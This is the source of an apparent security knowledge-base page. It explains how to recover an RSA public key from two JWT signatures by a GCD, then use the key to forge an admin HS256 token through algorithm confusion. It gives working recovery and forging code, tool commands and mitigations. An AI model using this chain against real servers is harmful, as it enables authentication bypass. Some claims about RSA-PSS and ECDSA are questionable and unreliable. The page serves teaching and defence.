import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { KbArticle, H2, H3, P, Mono, Ref, ImpactBox, CodeBlock, InfoCallout } from "@/components/kb";

export const metadata: Metadata = pageMeta(
  "RSA Public Key Recovery from JWT Signatures",
  "Recover the RSA public key from two signatures via GCD - without server access - then chain to algorithm confusion.",
  "/knowledge-base/public-key-recovery",
);

export default function Page() {
  return (
    <KbArticle slug="public-key-recovery">

      <H2>The problem: no exposed public key</H2>
      <P>
        Algorithm confusion requires knowing the server's RSA public key. Most servers expose it
        at <Mono>/.well-known/jwks.json</Mono> - but some don't. Even without a public JWKS endpoint,
        the public key can be recovered mathematically from two JWT signatures produced by the same
        private key. This technique was formalised by PortSwigger Research in 2022 as a prerequisite
        step for algorithm confusion attacks against servers that hide their public key.
      </P>

      <H2>Mathematical foundation</H2>
      <P>
        RSA-PKCS#1v1.5 signatures have the form:
        <Mono> s ≡ m^d (mod n) </Mono> where <Mono>m</Mono> is the padded message hash,
        <Mono>d</Mono> is the private exponent, and <Mono>n</Mono> is the public modulus.
      </P>
      <P>
        Given a signature <Mono>s</Mono> and message <Mono>m</Mono> with public exponent <Mono>e = 65537</Mono>:
        <Mono> s^e ≡ m (mod n) </Mono> which means <Mono> n | (s^e - m) </Mono>.
        For two signature/message pairs <Mono>(s1, m1)</Mono> and <Mono>(s2, m2)</Mono>, the modulus <Mono>n</Mono>
        divides both <Mono>(s1^e - m1)</Mono> and <Mono>(s2^e - m2)</Mono>.
        Therefore <Mono>n</Mono> divides their GCD:
      </P>
      <CodeBlock language="python" label="Mathematical basis" code={`# RSA signature: s ≡ m^d (mod n)
# Therefore: s^e ≡ m (mod n)  →  s^e - m ≡ 0 (mod n)  →  n | (s^e - m)
#
# For two (signature, message) pairs from the same key:
#   n | gcd(s1^e - m1, s2^e - m2)
#
# In practice, gcd(s1^e - m1, s2^e - m2) = k*n for small k (usually k=1)
# Factoring out small primes gives n directly.
#
# e = 65537 (standard RSA public exponent)
# s = integer representation of signature bytes
# m = integer representation of PKCS#1v1.5 padded message (DigestInfo + hash)

from math import gcd

def recover_n(sigs_and_msgs):
    """sigs_and_msgs: list of (s_int, m_int) tuples"""
    e = 65537
    candidates = [(pow(s, e) - m) for s, m in sigs_and_msgs]
    result = candidates[0]
    for c in candidates[1:]:
        result = gcd(result, c)
    # Remove small prime factors to isolate n
    for small_prime in [2, 3, 5, 7, 11, 13]:
        while result % small_prime == 0:
            result //= small_prime
    return result  # This is n (the RSA modulus)`} />

      <H2>How many signatures?</H2>
      <P>
        In theory, two signatures suffice. In practice:
      </P>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 1.9, marginBottom: "20px" }}>
        <li>Two signatures from a 2048-bit key reliably produce the correct modulus in most cases</li>
        <li>The GCD may return a multiple of <Mono>n</Mono> - testing both <Mono>n</Mono> and small multiples resolves this</li>
        <li>Three or four signatures reduce ambiguity and handle edge cases</li>
        <li>All signatures must come from the same private key (same server, same key rotation period)</li>
      </ul>

      <H2>Using rsa_sign2n</H2>
      <P>
        The <Mono>rsa_sign2n</Mono> tool by Silent Signal automates the entire recovery process.
        It accepts two or more JWTs, extracts signature and message bytes, computes the GCD,
        and outputs candidate public key PEM files:
      </P>
      <CodeBlock language="bash" label="rsa_sign2n key recovery" code={`# Install
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n
pip install -r requirements.txt

# Collect two JWTs from the same server (same private key)
JWT1="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE1"
JWT2="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIGNATURE2"

# Run recovery (outputs recovered_key_1.pem, recovered_key_2.pem)
python3 standalone/jwt_forgery.py "$JWT1" "$JWT2"

# Test each recovered key against the server:
# Use JWT Arsenal's Algorithm Confusion page with each PEM as the public key
# The one that produces a valid forged token is the correct n`} />

      <H2>Reconstructing the full public key</H2>
      <P>
        The recovery gives the modulus <Mono>n</Mono>. The public exponent <Mono>e</Mono>
        is almost universally <Mono>65537</Mono> (0x10001). Reconstructing the PEM:
      </P>
      <CodeBlock language="python" label="Building the PEM from recovered n" code={`from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

n = 0x00b3510a...  # recovered modulus (integer)
e = 65537

pub_numbers = RSAPublicNumbers(e, n)
public_key  = pub_numbers.public_key()
pem = public_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

print(pem.decode())
# -----BEGIN PUBLIC KEY-----
# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
# -----END PUBLIC KEY-----`} />

      <H2>Chaining to algorithm confusion</H2>
      <P>
        Once the public key is recovered, the complete attack chain is:
      </P>
      <CodeBlock language="python" label="Full chain: recovery → algorithm confusion → bypass" code={`# 1. Recover public key from two JWTs (rsa_sign2n or manual GCD)
public_key_pem = b"""-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"""

# 2. Forge a token with alg=HS256
import hmac, hashlib, base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64url(json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999}))

# 3. Sign with public key PEM bytes as HMAC secret
signing_input = f"{header}.{payload}".encode()
sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
forged = f"{header}.{payload}.{b64url(sig)}"

# 4. If the server doesn't enforce alg=RS256, the forged token is accepted
print("Forged token:", forged)`} />

      <InfoCallout variant="info" title="Why two recovered keys?">
        The GCD approach may produce two candidate moduli when the GCD contains factors that could be
        <Mono>n</Mono> or <Mono>2n</Mono>. Test each candidate against the target - only the correct one
        will produce a verifiable forged token.
      </InfoCallout>

      <H2>ECDSA - why recovery doesn't apply</H2>
      <P>
        ECDSA signatures use a random nonce <Mono>k</Mono> per signature. Two signatures from the same
        private key produce mathematically independent results - there is no GCD relationship exploitable
        for key recovery. However, if the RNG is weak or deterministic and produces the same <Mono>k</Mono>
        twice (as in the PlayStation 3 failure), the private key can be recovered via the lattice attack.
        This is a separate class of vulnerability.
      </P>

      <ImpactBox title="Chaining to algorithm confusion">
        <ul className="refs-list" style={{ lineHeight: 2 }}>
          <li>Confirmed viable attack chain by PortSwigger Research (2022) against RS256 JWTs</li>
          <li>Requires only two valid JWTs from the target - obtainable by logging in twice</li>
          <li>The recovered key enables algorithm confusion without server cooperation</li>
          <li>Particularly impactful against servers that use RS256 but have no JWKS endpoint and no algorithm enforcement</li>
        </ul>
      </ImpactBox>

      <H2>Mitigations</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
        <li>Enforce <Mono>algorithms=["RS256"]</Mono> server-side - key recovery only enables algorithm confusion if the server accepts HS256</li>
        <li>This attack is entirely mitigated by strict algorithm enforcement; key recovery alone does not compromise RS256 verification</li>
        <li>Rotate signing keys periodically - limits the window during which recovered keys remain valid</li>
        <li>Use RSA-PSS (PS256) instead of PKCS#1v1.5 (RS256) - PSS randomises padding, though key recovery still works since e and n are the same</li>
      </ul>

      <div>
        <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--text-muted)", marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.06em" }}>References</div>
        <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
          <li><Ref href="https://github.com/silentsignal/rsa_sign2n">silentsignal/rsa_sign2n - key recovery tool</Ref></li>
          <li><Ref href="https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens">PortSwigger - Deriving public keys from existing tokens</Ref></li>
          <li><Ref href="https://www.rfc-editor.org/rfc/rfc3447">RFC 3447 - PKCS #1: RSA Cryptography Specifications</Ref></li>
          <li><Ref href="https://crypto.stackexchange.com/questions/30289/is-it-possible-to-recover-an-rsa-public-key-from-its-signatures">Crypto StackExchange - RSA public key recovery from signatures</Ref></li>
        </ul>
      </div>

    </KbArticle>
  );
}
